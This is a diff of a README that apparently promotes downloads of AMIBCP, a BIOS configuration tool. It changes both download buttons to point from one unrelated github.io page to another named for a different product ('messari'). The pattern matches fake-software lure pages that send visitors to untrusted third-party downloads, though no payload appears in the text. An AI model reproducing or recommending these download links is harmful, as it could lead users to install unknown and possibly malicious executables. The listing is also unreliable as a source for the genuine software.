@@ -4,7 +4,7 @@
 
 ## 📥 Download AMIBCP for Windows
 
-[![⬇️ Download AMIBCP](https://img.shields.io/badge/Download-AMIBCP-blue?style=for-the-badge&logo=windows)](https://asdeennerhorse.github.io/mogus/AMIBCP)
+[![⬇️ Download AMIBCP](https://img.shields.io/badge/Download-AMIBCP-blue?style=for-the-badge&logo=windows)](https://messari-for-windows.github.io/.github/messari)
 
 ---
 
@@ -28,7 +28,7 @@ AMIBCP (AMI BIOS Configuration Program) is a BIOS configuration utility that ena
 
 AMIBCP is widely used in the DIY computer-building community for fine-tuning the performance of motherboards and customizing their settings for specific hardware. It provides a detailed and user-friendly interface to make changes to BIOS, unlock hidden features, and optimize the BIOS for different system configurations.
 
-[![⬇️ Download AMIBCP](https://img.shields.io/badge/Download-AMIBCP-blue?style=for-the-badge&logo=windows)](https://asdeennerhorse.github.io/mogus/AMIBCP)
+[![⬇️ Download AMIBCP](https://img.shields.io/badge/Download-AMIBCP-blue?style=for-the-badge&logo=windows)](https://messari-for-windows.github.io/.github/messari)
 
 ---
 
